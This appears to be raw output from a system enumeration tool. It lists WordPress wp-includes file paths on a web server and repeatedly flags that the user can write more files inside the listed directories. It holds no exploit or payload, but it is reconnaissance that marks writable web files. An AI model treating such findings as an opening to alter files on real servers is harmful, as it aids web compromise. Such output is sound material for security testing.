/var/www/wordpress/wp-includes/SimplePie/XML/Declaration/Parser.php
/var/www/wordpress/wp-includes/SimplePie/gzdecode.php
/var/www/wordpress/wp-includes/Text
/var/www/wordpress/wp-includes/Text/Diff
/var/www/wordpress/wp-includes/Text/Diff.php
/var/www/wordpress/wp-includes/Text/Diff/Engine
/var/www/wordpress/wp-includes/Text/Diff/Engine/native.php
/var/www/wordpress/wp-includes/Text/Diff/Engine/shell.php
/var/www/wordpress/wp-includes/Text/Diff/Engine/string.php
/var/www/wordpress/wp-includes/Text/Diff/Engine/xdiff.php
/var/www/wordpress/wp-includes/Text/Diff/Renderer
/var/www/wordpress/wp-includes/Text/Diff/Renderer.php
/var/www/wordpress/wp-includes/Text/Diff/Renderer/inline.php
/var/www/wordpress/wp-includes/admin-bar.php
/var/www/wordpress/wp-includes/atomlib.php
/var/www/wordpress/wp-includes/author-template.php
/var/www/wordpress/wp-includes/blocks
/var/www/wordpress/wp-includes/blocks.php
/var/www/wordpress/wp-includes/blocks/archives.php
/var/www/wordpress/wp-includes/blocks/block.php
/var/www/wordpress/wp-includes/blocks/categories.php
/var/www/wordpress/wp-includes/blocks/latest-comments.php
/var/www/wordpress/wp-includes/blocks/latest-posts.php
/var/www/wordpress/wp-includes/blocks/shortcode.php
/var/www/wordpress/wp-includes/bookmark-template.php
/var/www/wordpress/wp-includes/bookmark.php
/var/www/wordpress/wp-includes/cache.php
/var/www/wordpress/wp-includes/canonical.php
/var/www/wordpress/wp-includes/capabilities.php
/var/www/wordpress/wp-includes/category-template.php
/var/www/wordpress/wp-includes/category.php
/var/www/wordpress/wp-includes/certificates
/var/www/wordpress/wp-includes/certificates/ca-bundle.crt
/var/www/wordpress/wp-includes/class-IXR.php
/var/www/wordpress/wp-includes/class-feed.php
/var/www/wordpress/wp-includes/class-http.php
/var/www/wordpress/wp-includes/class-json.php
/var/www/wordpress/wp-includes/class-oembed.php
/var/www/wordpress/wp-includes/class-phpass.php
/var/www/wordpress/wp-includes/class-phpmailer.php
/var/www/wordpress/wp-includes/class-pop3.php
/var/www/wordpress/wp-includes/class-requests.php
/var/www/wordpress/wp-includes/class-simplepie.php
/var/www/wordpress/wp-includes/class-smtp.php
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-includes/css/admin-bar-rtl.min.css
/var/www/wordpress/wp-includes/css/admin-bar.css
/var/www/wordpress/wp-includes/css/admin-bar.min.css
/var/www/wordpress/wp-includes/css/buttons-rtl.css
/var/www/wordpress/wp-includes/css/buttons-rtl.min.css
/var/www/wordpress/wp-includes/css/buttons.css
/var/www/wordpress/wp-includes/css/buttons.min.css
/var/www/wordpress/wp-includes/css/customize-preview-rtl.css
/var/www/wordpress/wp-includes/css/customize-preview-rtl.min.css
/var/www/wordpress/wp-includes/css/customize-preview.css
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-includes/css/dist/block-library/editor-rtl.css
/var/www/wordpress/wp-includes/css/dist/block-library/editor-rtl.min.css
/var/www/wordpress/wp-includes/css/dist/block-library/editor.css
/var/www/wordpress/wp-includes/css/dist/block-library/editor.min.css
/var/www/wordpress/wp-includes/css/dist/block-library/style-rtl.css
/var/www/wordpress/wp-includes/css/dist/block-library/style-rtl.min.css
/var/www/wordpress/wp-includes/css/dist/block-library/style.css
/var/www/wordpress/wp-includes/css/dist/block-library/style.min.css
/var/www/wordpress/wp-includes/css/dist/block-library/theme-rtl.css
/var/www/wordpress/wp-includes/css/dist/block-library/theme-rtl.min.css
/var/www/wordpress/wp-includes/css/dist/block-library/theme.css
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-includes/css/dist/components/style-rtl.css
/var/www/wordpress/wp-includes/css/dist/components/style-rtl.min.css
/var/www/wordpress/wp-includes/css/dist/components/style.css
/var/www/wordpress/wp-includes/css/dist/components/style.min.css
/var/www/wordpress/wp-includes/css/dist/edit-post
/var/www/wordpress/wp-includes/css/dist/edit-post/style-rtl.css
/var/www/wordpress/wp-includes/css/dist/edit-post/style-rtl.min.css
/var/www/wordpress/wp-includes/css/dist/edit-post/style.css
/var/www/wordpress/wp-includes/css/dist/edit-post/style.min.css
/var/www/wordpress/wp-includes/css/dist/editor
/var/www/wordpress/wp-includes/css/dist/editor/editor-styles-rtl.css
/var/www/wordpress/wp-includes/css/dist/editor/editor-styles-rtl.min.css
/var/www/wordpress/wp-includes/css/dist/editor/editor-styles.css
/var/www/wordpress/wp-includes/css/dist/editor/editor-styles.min.css
/var/www/wordpress/wp-includes/css/dist/editor/style-rtl.css
/var/www/wordpress/wp-includes/css/dist/editor/style-rtl.min.css
/var/www/wordpress/wp-includes/css/dist/editor/style.css
/var/www/wordpress/wp-includes/css/dist/editor/style.min.css
/var/www/wordpress/wp-includes/css/dist/format-library
/var/www/wordpress/wp-includes/css/dist/format-library/style-rtl.css
/var/www/wordpress/wp-includes/css/dist/format-library/style-rtl.min.css
/var/www/wordpress/wp-includes/css/dist/format-library/style.css
/var/www/wordpress/wp-includes/css/dist/format-library/style.min.css
/var/www/wordpress/wp-includes/css/dist/list-reusable-blocks
/var/www/wordpress/wp-includes/css/dist/list-reusable-blocks/style-rtl.css
/var/www/wordpress/wp-includes/css/dist/list-reusable-blocks/style-rtl.min.css
/var/www/wordpress/wp-includes/css/dist/list-reusable-blocks/style.css
/var/www/wordpress/wp-includes/css/dist/list-reusable-blocks/style.min.css
/var/www/wordpress/wp-includes/css/dist/nux
/var/www/wordpress/wp-includes/css/dist/nux/style-rtl.css
/var/www/wordpress/wp-includes/css/dist/nux/style-rtl.min.css
/var/www/wordpress/wp-includes/css/dist/nux/style.css
/var/www/wordpress/wp-includes/css/dist/nux/style.min.css
/var/www/wordpress/wp-includes/css/editor-rtl.css
/var/www/wordpress/wp-includes/css/editor-rtl.min.css
/var/www/wordpress/wp-includes/css/editor.css
/var/www/wordpress/wp-includes/css/editor.min.css
/var/www/wordpress/wp-includes/css/jquery-ui-dialog-rtl.css
/var/www/wordpress/wp-includes/css/jquery-ui-dialog-rtl.min.css
/var/www/wordpress/wp-includes/css/jquery-ui-dialog.css
/var/www/wordpress/wp-includes/css/jquery-ui-dialog.min.css
/var/www/wordpress/wp-includes/css/media-views-rtl.css
/var/www/wordpress/wp-includes/css/media-views-rtl.min.css
/var/www/wordpress/wp-includes/css/media-views.css
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-includes/customize/class-wp-customize-background-image-control.php
/var/www/wordpress/wp-includes/customize/class-wp-customize-background-image-setting.php
/var/www/wordpress/wp-includes/customize/class-wp-customize-background-position-control.php
/var/www/wordpress/wp-includes/customize/class-wp-customize-code-editor-control.php
/var/www/wordpress/wp-includes/customize/class-wp-customize-color-control.php
/var/www/wordpress/wp-includes/customize/class-wp-customize-cropped-image-control.php
/var/www/wordpress/wp-includes/customize/class-wp-customize-custom-css-setting.php
/var/www/wordpress/wp-includes/customize/class-wp-customize-date-time-control.php
/var/www/wordpress/wp-includes/customize/class-wp-customize-filter-setting.php
/var/www/wordpress/wp-includes/customize/class-wp-customize-header-image-control.php
/var/www/wordpress/wp-includes/customize/class-wp-customize-header-image-setting.php
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-includes/default-constants.php
/var/www/wordpress/wp-includes/default-filters.php
/var/www/wordpress/wp-includes/default-widgets.php
/var/www/wordpress/wp-includes/deprecated.php
/var/www/wordpress/wp-includes/embed-template.php
/var/www/wordpress/wp-includes/embed.php
/var/www/wordpress/wp-includes/feed-atom-comments.php
/var/www/wordpress/wp-includes/feed-atom.php
/var/www/wordpress/wp-includes/feed-rdf.php
/var/www/wordpress/wp-includes/feed-rss.php
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-includes/fonts/dashicons.svg
/var/www/wordpress/wp-includes/fonts/dashicons.ttf
/var/www/wordpress/wp-includes/fonts/dashicons.woff
/var/www/wordpress/wp-includes/formatting.php
/var/www/wordpress/wp-includes/functions.php
/var/www/wordpress/wp-includes/functions.wp-scripts.php
/var/www/wordpress/wp-includes/functions.wp-styles.php
/var/www/wordpress/wp-includes/general-template.php
/var/www/wordpress/wp-includes/http.php
/var/www/wordpress/wp-includes/images
/var/www/wordpress/wp-includes/images/crystal
/var/www/wordpress/wp-includes/images/crystal/license.txt
/var/www/wordpress/wp-includes/images/media
/var/www/wordpress/wp-includes/images/smilies
/var/www/wordpress/wp-includes/images/wlw
/var/www/wordpress/wp-includes/js
/var/www/wordpress/wp-includes/js/admin-bar.js
/var/www/wordpress/wp-includes/js/admin-bar.min.js
/var/www/wordpress/wp-includes/js/api-request.js
/var/www/wordpress/wp-includes/js/api-request.min.js
/var/www/wordpress/wp-includes/js/autosave.js
/var/www/wordpress/wp-includes/js/autosave.min.js
/var/www/wordpress/wp-includes/js/backbone.min.js
/var/www/wordpress/wp-includes/js/codemirror
/var/www/wordpress/wp-includes/js/codemirror/codemirror.min.css
/var/www/wordpress/wp-includes/js/codemirror/codemirror.min.js
/var/www/wordpress/wp-includes/js/codemirror/csslint.js
/var/www/wordpress/wp-includes/js/codemirror/htmlhint-kses.js
/var/www/wordpress/wp-includes/js/codemirror/htmlhint.js
/var/www/wordpress/wp-includes/js/codemirror/jshint.js
/var/www/wordpress/wp-includes/js/codemirror/jsonlint.js
/var/www/wordpress/wp-includes/js/colorpicker.js
/var/www/wordpress/wp-includes/js/colorpicker.min.js
/var/www/wordpress/wp-includes/js/comment-reply.js
/var/www/wordpress/wp-includes/js/comment-reply.min.js
/var/www/wordpress/wp-includes/js/crop
/var/www/wordpress/wp-includes/js/crop/cropper.css
/var/www/wordpress/wp-includes/js/crop/cropper.js
/var/www/wordpress/wp-includes/js/customize-base.js
/var/www/wordpress/wp-includes/js/customize-base.min.js
/var/www/wordpress/wp-includes/js/customize-loader.js
/var/www/wordpress/wp-includes/js/customize-loader.min.js
/var/www/wordpress/wp-includes/js/customize-models.js
/var/www/wordpress/wp-includes/js/customize-models.min.js
/var/www/wordpress/wp-includes/js/customize-preview-nav-menus.js
/var/www/wordpress/wp-includes/js/customize-preview-nav-menus.min.js
/var/www/wordpress/wp-includes/js/customize-preview-widgets.js
/var/www/wordpress/wp-includes/js/customize-preview-widgets.min.js
/var/www/wordpress/wp-includes/js/customize-preview.js
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-includes/js/dist/a11y.min.js
/var/www/wordpress/wp-includes/js/dist/annotations.js
/var/www/wordpress/wp-includes/js/dist/annotations.min.js
/var/www/wordpress/wp-includes/js/dist/api-fetch.js
/var/www/wordpress/wp-includes/js/dist/api-fetch.min.js
/var/www/wordpress/wp-includes/js/dist/autop.js
/var/www/wordpress/wp-includes/js/dist/autop.min.js
/var/www/wordpress/wp-includes/js/dist/blob.js
/var/www/wordpress/wp-includes/js/dist/blob.min.js
/var/www/wordpress/wp-includes/js/dist/block-library.js
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-includes/js/dist/vendor/lodash.min.js
/var/www/wordpress/wp-includes/js/dist/vendor/moment.js
/var/www/wordpress/wp-includes/js/dist/vendor/moment.min.js
/var/www/wordpress/wp-includes/js/dist/vendor/react-dom.js
/var/www/wordpress/wp-includes/js/dist/vendor/react-dom.min.js
/var/www/wordpress/wp-includes/js/dist/vendor/react.js
/var/www/wordpress/wp-includes/js/dist/vendor/react.min.js
/var/www/wordpress/wp-includes/js/dist/vendor/wp-polyfill-element-closest.js
/var/www/wordpress/wp-includes/js/dist/vendor/wp-polyfill-element-closest.min.js
/var/www/wordpress/wp-includes/js/dist/vendor/wp-polyfill-fetch.js
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-includes/js/dist/viewport.min.js
/var/www/wordpress/wp-includes/js/dist/wordcount.js
/var/www/wordpress/wp-includes/js/dist/wordcount.min.js
/var/www/wordpress/wp-includes/js/heartbeat.js
/var/www/wordpress/wp-includes/js/heartbeat.min.js
/var/www/wordpress/wp-includes/js/hoverIntent.js
/var/www/wordpress/wp-includes/js/hoverIntent.min.js
/var/www/wordpress/wp-includes/js/imagesloaded.min.js
/var/www/wordpress/wp-includes/js/imgareaselect
/var/www/wordpress/wp-includes/js/imgareaselect/imgareaselect.css
/var/www/wordpress/wp-includes/js/imgareaselect/jquery.imgareaselect.js
/var/www/wordpress/wp-includes/js/imgareaselect/jquery.imgareaselect.min.js
/var/www/wordpress/wp-includes/js/jcrop
/var/www/wordpress/wp-includes/js/jcrop/jquery.Jcrop.min.css
/var/www/wordpress/wp-includes/js/jcrop/jquery.Jcrop.min.js
/var/www/wordpress/wp-includes/js/jquery
/var/www/wordpress/wp-includes/js/jquery/jquery-migrate.js
/var/www/wordpress/wp-includes/js/jquery/jquery-migrate.min.js
/var/www/wordpress/wp-includes/js/jquery/jquery.color.min.js
/var/www/wordpress/wp-includes/js/jquery/jquery.form.js
/var/www/wordpress/wp-includes/js/jquery/jquery.form.min.js
/var/www/wordpress/wp-includes/js/jquery/jquery.hotkeys.js
/var/www/wordpress/wp-includes/js/jquery/jquery.hotkeys.min.js
/var/www/wordpress/wp-includes/js/jquery/jquery.js
/var/www/wordpress/wp-includes/js/jquery/jquery.masonry.min.js
/var/www/wordpress/wp-includes/js/jquery/jquery.query.js
/var/www/wordpress/wp-includes/js/jquery/jquery.schedule.js
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-includes/js/jquery/ui/autocomplete.min.js
/var/www/wordpress/wp-includes/js/jquery/ui/button.min.js
/var/www/wordpress/wp-includes/js/jquery/ui/core.min.js
/var/www/wordpress/wp-includes/js/jquery/ui/datepicker.min.js
/var/www/wordpress/wp-includes/js/jquery/ui/dialog.min.js
/var/www/wordpress/wp-includes/js/jquery/ui/draggable.min.js
/var/www/wordpress/wp-includes/js/jquery/ui/droppable.min.js
/var/www/wordpress/wp-includes/js/jquery/ui/effect-blind.min.js
/var/www/wordpress/wp-includes/js/jquery/ui/effect-bounce.min.js
/var/www/wordpress/wp-includes/js/jquery/ui/effect-clip.min.js
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-includes/js/json2.min.js
/var/www/wordpress/wp-includes/js/masonry.min.js
/var/www/wordpress/wp-includes/js/mce-view.js
/var/www/wordpress/wp-includes/js/mce-view.min.js
/var/www/wordpress/wp-includes/js/media-audiovideo.js
/var/www/wordpress/wp-includes/js/media-audiovideo.min.js
/var/www/wordpress/wp-includes/js/media-editor.js
/var/www/wordpress/wp-includes/js/media-editor.min.js
/var/www/wordpress/wp-includes/js/media-grid.js
/var/www/wordpress/wp-includes/js/media-grid.min.js
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-includes/js/mediaelement/mediaelement-and-player.min.js
/var/www/wordpress/wp-includes/js/mediaelement/mediaelement-migrate.js
/var/www/wordpress/wp-includes/js/mediaelement/mediaelement-migrate.min.js
/var/www/wordpress/wp-includes/js/mediaelement/mediaelement.js
/var/www/wordpress/wp-includes/js/mediaelement/mediaelement.min.js
/var/www/wordpress/wp-includes/js/mediaelement/mediaelementplayer-legacy.css
/var/www/wordpress/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css
/var/www/wordpress/wp-includes/js/mediaelement/mediaelementplayer.css
/var/www/wordpress/wp-includes/js/mediaelement/mediaelementplayer.min.css
/var/www/wordpress/wp-includes/js/mediaelement/mejs-controls.svg
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-includes/js/mediaelement/renderers/vimeo.min.js
/var/www/wordpress/wp-includes/js/mediaelement/wp-mediaelement.css
/var/www/wordpress/wp-includes/js/mediaelement/wp-mediaelement.js
/var/www/wordpress/wp-includes/js/mediaelement/wp-mediaelement.min.css
/var/www/wordpress/wp-includes/js/mediaelement/wp-mediaelement.min.js
/var/www/wordpress/wp-includes/js/mediaelement/wp-playlist.js
/var/www/wordpress/wp-includes/js/mediaelement/wp-playlist.min.js
/var/www/wordpress/wp-includes/js/plupload
/var/www/wordpress/wp-includes/js/plupload/handlers.js
/var/www/wordpress/wp-includes/js/plupload/handlers.min.js
/var/www/wordpress/wp-includes/js/plupload/license.txt
/var/www/wordpress/wp-includes/js/plupload/moxie.js
/var/www/wordpress/wp-includes/js/plupload/moxie.min.js
/var/www/wordpress/wp-includes/js/plupload/plupload.js
/var/www/wordpress/wp-includes/js/plupload/plupload.min.js
/var/www/wordpress/wp-includes/js/plupload/wp-plupload.js
/var/www/wordpress/wp-includes/js/plupload/wp-plupload.min.js
/var/www/wordpress/wp-includes/js/quicktags.js
/var/www/wordpress/wp-includes/js/quicktags.min.js
/var/www/wordpress/wp-includes/js/shortcode.js
/var/www/wordpress/wp-includes/js/shortcode.min.js
/var/www/wordpress/wp-includes/js/swfobject.js
/var/www/wordpress/wp-includes/js/swfupload
/var/www/wordpress/wp-includes/js/swfupload/handlers.js
/var/www/wordpress/wp-includes/js/swfupload/handlers.min.js
/var/www/wordpress/wp-includes/js/swfupload/license.txt
/var/www/wordpress/wp-includes/js/swfupload/swfupload.js
/var/www/wordpress/wp-includes/js/thickbox
/var/www/wordpress/wp-includes/js/thickbox/thickbox.css
/var/www/wordpress/wp-includes/js/thickbox/thickbox.js
/var/www/wordpress/wp-includes/js/tinymce
/var/www/wordpress/wp-includes/js/tinymce/langs
/var/www/wordpress/wp-includes/js/tinymce/langs/wp-langs-en.js
/var/www/wordpress/wp-includes/js/tinymce/license.txt
/var/www/wordpress/wp-includes/js/tinymce/plugins
/var/www/wordpress/wp-includes/js/tinymce/plugins/charmap
/var/www/wordpress/wp-includes/js/tinymce/plugins/charmap/plugin.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/charmap/plugin.min.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/colorpicker
/var/www/wordpress/wp-includes/js/tinymce/plugins/colorpicker/plugin.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/colorpicker/plugin.min.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/compat3x
/var/www/wordpress/wp-includes/js/tinymce/plugins/compat3x/css
/var/www/wordpress/wp-includes/js/tinymce/plugins/compat3x/css/dialog.css
/var/www/wordpress/wp-includes/js/tinymce/plugins/compat3x/plugin.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/compat3x/plugin.min.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/directionality
/var/www/wordpress/wp-includes/js/tinymce/plugins/directionality/plugin.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/directionality/plugin.min.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/fullscreen
/var/www/wordpress/wp-includes/js/tinymce/plugins/fullscreen/plugin.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/fullscreen/plugin.min.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/hr
/var/www/wordpress/wp-includes/js/tinymce/plugins/hr/plugin.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/hr/plugin.min.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/image
/var/www/wordpress/wp-includes/js/tinymce/plugins/image/plugin.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/image/plugin.min.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/link
/var/www/wordpress/wp-includes/js/tinymce/plugins/link/plugin.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/link/plugin.min.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/lists
/var/www/wordpress/wp-includes/js/tinymce/plugins/lists/plugin.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/lists/plugin.min.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/media
/var/www/wordpress/wp-includes/js/tinymce/plugins/media/plugin.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/media/plugin.min.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/paste
/var/www/wordpress/wp-includes/js/tinymce/plugins/paste/plugin.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/paste/plugin.min.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/tabfocus
/var/www/wordpress/wp-includes/js/tinymce/plugins/tabfocus/plugin.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/tabfocus/plugin.min.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/textcolor
/var/www/wordpress/wp-includes/js/tinymce/plugins/textcolor/plugin.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/textcolor/plugin.min.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/wordpress
/var/www/wordpress/wp-includes/js/tinymce/plugins/wordpress/plugin.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/wordpress/plugin.min.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/wpautoresize
/var/www/wordpress/wp-includes/js/tinymce/plugins/wpautoresize/plugin.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/wpautoresize/plugin.min.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/wpdialogs
/var/www/wordpress/wp-includes/js/tinymce/plugins/wpdialogs/plugin.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/wpdialogs/plugin.min.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/wpeditimage
/var/www/wordpress/wp-includes/js/tinymce/plugins/wpeditimage/plugin.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/wpeditimage/plugin.min.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/wpemoji
/var/www/wordpress/wp-includes/js/tinymce/plugins/wpemoji/plugin.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/wpemoji/plugin.min.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/wpgallery
/var/www/wordpress/wp-includes/js/tinymce/plugins/wpgallery/plugin.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/wpgallery/plugin.min.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/wplink
/var/www/wordpress/wp-includes/js/tinymce/plugins/wplink/plugin.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/wplink/plugin.min.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/wptextpattern
/var/www/wordpress/wp-includes/js/tinymce/plugins/wptextpattern/plugin.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/wptextpattern/plugin.min.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/wpview
/var/www/wordpress/wp-includes/js/tinymce/plugins/wpview/plugin.js
/var/www/wordpress/wp-includes/js/tinymce/plugins/wpview/plugin.min.js
/var/www/wordpress/wp-includes/js/tinymce/skins
/var/www/wordpress/wp-includes/js/tinymce/skins/lightgray
/var/www/wordpress/wp-includes/js/tinymce/skins/lightgray/content.inline.min.css
/var/www/wordpress/wp-includes/js/tinymce/skins/lightgray/content.min.css
/var/www/wordpress/wp-includes/js/tinymce/skins/lightgray/fonts
/var/www/wordpress/wp-includes/js/tinymce/skins/lightgray/fonts/tinymce-small.eot
/var/www/wordpress/wp-includes/js/tinymce/skins/lightgray/fonts/tinymce-small.svg
/var/www/wordpress/wp-includes/js/tinymce/skins/lightgray/fonts/tinymce-small.ttf
/var/www/wordpress/wp-includes/js/tinymce/skins/lightgray/fonts/tinymce-small.woff
/var/www/wordpress/wp-includes/js/tinymce/skins/lightgray/fonts/tinymce.eot
/var/www/wordpress/wp-includes/js/tinymce/skins/lightgray/fonts/tinymce.svg
/var/www/wordpress/wp-includes/js/tinymce/skins/lightgray/fonts/tinymce.ttf
/var/www/wordpress/wp-includes/js/tinymce/skins/lightgray/fonts/tinymce.woff
/var/www/wordpress/wp-includes/js/tinymce/skins/lightgray/img
/var/www/wordpress/wp-includes/js/tinymce/skins/lightgray/skin.min.css
/var/www/wordpress/wp-includes/js/tinymce/skins/wordpress
/var/www/wordpress/wp-includes/js/tinymce/skins/wordpress/images
/var/www/wordpress/wp-includes/js/tinymce/skins/wordpress/wp-content.css
/var/www/wordpress/wp-includes/js/tinymce/themes
/var/www/wordpress/wp-includes/js/tinymce/themes/inlite
/var/www/wordpress/wp-includes/js/tinymce/themes/inlite/theme.js
/var/www/wordpress/wp-includes/js/tinymce/themes/inlite/theme.min.js
/var/www/wordpress/wp-includes/js/tinymce/themes/modern
/var/www/wordpress/wp-includes/js/tinymce/themes/modern/theme.js
/var/www/wordpress/wp-includes/js/tinymce/themes/modern/theme.min.js
/var/www/wordpress/wp-includes/js/tinymce/tiny_mce_popup.js
/var/www/wordpress/wp-includes/js/tinymce/tinymce.min.js
/var/www/wordpress/wp-includes/js/tinymce/utils
/var/www/wordpress/wp-includes/js/tinymce/utils/editable_selects.js
/var/www/wordpress/wp-includes/js/tinymce/utils/form_utils.js
/var/www/wordpress/wp-includes/js/tinymce/utils/mctabs.js
/var/www/wordpress/wp-includes/js/tinymce/utils/validate.js
/var/www/wordpress/wp-includes/js/tinymce/wp-tinymce.js.gz
/var/www/wordpress/wp-includes/js/tinymce/wp-tinymce.php
/var/www/wordpress/wp-includes/js/tw-sack.js
/var/www/wordpress/wp-includes/js/tw-sack.min.js
/var/www/wordpress/wp-includes/js/twemoji.js
/var/www/wordpress/wp-includes/js/twemoji.min.js
/var/www/wordpress/wp-includes/js/underscore.min.js
/var/www/wordpress/wp-includes/js/utils.js
/var/www/wordpress/wp-includes/js/utils.min.js
/var/www/wordpress/wp-includes/js/wp-a11y.js
/var/www/wordpress/wp-includes/js/wp-a11y.min.js
/var/www/wordpress/wp-includes/js/wp-ajax-response.js
/var/www/wordpress/wp-includes/js/wp-ajax-response.min.js
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-includes/l10n.php
/var/www/wordpress/wp-includes/link-template.php
/var/www/wordpress/wp-includes/load.php
/var/www/wordpress/wp-includes/locale.php
/var/www/wordpress/wp-includes/media-template.php
/var/www/wordpress/wp-includes/media.php
/var/www/wordpress/wp-includes/meta.php
/var/www/wordpress/wp-includes/ms-blogs.php
/var/www/wordpress/wp-includes/ms-default-constants.php
/var/www/wordpress/wp-includes/ms-default-filters.php
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-includes/pomo/mo.php
/var/www/wordpress/wp-includes/pomo/plural-forms.php
/var/www/wordpress/wp-includes/pomo/po.php
/var/www/wordpress/wp-includes/pomo/streams.php
/var/www/wordpress/wp-includes/pomo/translations.php
/var/www/wordpress/wp-includes/post-formats.php
/var/www/wordpress/wp-includes/post-template.php
/var/www/wordpress/wp-includes/post-thumbnail-template.php
/var/www/wordpress/wp-includes/post.php
/var/www/wordpress/wp-includes/query.php
/var/www/wordpress/wp-includes/random_compat
/var/www/wordpress/wp-includes/random_compat/byte_safe_strings.php
/var/www/wordpress/wp-includes/random_compat/cast_to_int.php
/var/www/wordpress/wp-includes/random_compat/error_polyfill.php
/var/www/wordpress/wp-includes/random_compat/random.php
/var/www/wordpress/wp-includes/random_compat/random_bytes_com_dotnet.php
/var/www/wordpress/wp-includes/random_compat/random_bytes_dev_urandom.php
/var/www/wordpress/wp-includes/random_compat/random_bytes_libsodium.php
/var/www/wordpress/wp-includes/random_compat/random_bytes_libsodium_legacy.php
/var/www/wordpress/wp-includes/random_compat/random_bytes_mcrypt.php
/var/www/wordpress/wp-includes/random_compat/random_bytes_openssl.php
/var/www/wordpress/wp-includes/random_compat/random_int.php
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-includes/registration.php
/var/www/wordpress/wp-includes/rest-api
/var/www/wordpress/wp-includes/rest-api.php
/var/www/wordpress/wp-includes/rest-api/class-wp-rest-request.php
/var/www/wordpress/wp-includes/rest-api/class-wp-rest-response.php
/var/www/wordpress/wp-includes/rest-api/class-wp-rest-server.php
/var/www/wordpress/wp-includes/rest-api/endpoints
/var/www/wordpress/wp-includes/rest-api/endpoints/class-wp-rest-attachments-controller.php
/var/www/wordpress/wp-includes/rest-api/endpoints/class-wp-rest-autosaves-controller.php
/var/www/wordpress/wp-includes/rest-api/endpoints/class-wp-rest-block-renderer-controller.php
/var/www/wordpress/wp-includes/rest-api/endpoints/class-wp-rest-blocks-controller.php
/var/www/wordpress/wp-includes/rest-api/endpoints/class-wp-rest-comments-controller.php
/var/www/wordpress/wp-includes/rest-api/endpoints/class-wp-rest-controller.php
/var/www/wordpress/wp-includes/rest-api/endpoints/class-wp-rest-post-statuses-controller.php
/var/www/wordpress/wp-includes/rest-api/endpoints/class-wp-rest-post-types-controller.php
/var/www/wordpress/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php
/var/www/wordpress/wp-includes/rest-api/endpoints/class-wp-rest-revisions-controller.php
/var/www/wordpress/wp-includes/rest-api/endpoints/class-wp-rest-search-controller.php
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-includes/rest-api/fields/class-wp-rest-comment-meta-fields.php
/var/www/wordpress/wp-includes/rest-api/fields/class-wp-rest-meta-fields.php
/var/www/wordpress/wp-includes/rest-api/fields/class-wp-rest-post-meta-fields.php
/var/www/wordpress/wp-includes/rest-api/fields/class-wp-rest-term-meta-fields.php
/var/www/wordpress/wp-includes/rest-api/fields/class-wp-rest-user-meta-fields.php
/var/www/wordpress/wp-includes/rest-api/search
/var/www/wordpress/wp-includes/rest-api/search/class-wp-rest-post-search-handler.php
/var/www/wordpress/wp-includes/rest-api/search/class-wp-rest-search-handler.php
/var/www/wordpress/wp-includes/revision.php
/var/www/wordpress/wp-includes/rewrite.php
/var/www/wordpress/wp-includes/rss-functions.php
/var/www/wordpress/wp-includes/rss.php
/var/www/wordpress/wp-includes/script-loader.php
/var/www/wordpress/wp-includes/session.php
/var/www/wordpress/wp-includes/shortcodes.php
/var/www/wordpress/wp-includes/spl-autoload-compat.php
/var/www/wordpress/wp-includes/taxonomy.php
/var/www/wordpress/wp-includes/template-loader.php
/var/www/wordpress/wp-includes/template.php
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-includes/theme-compat/embed-404.php
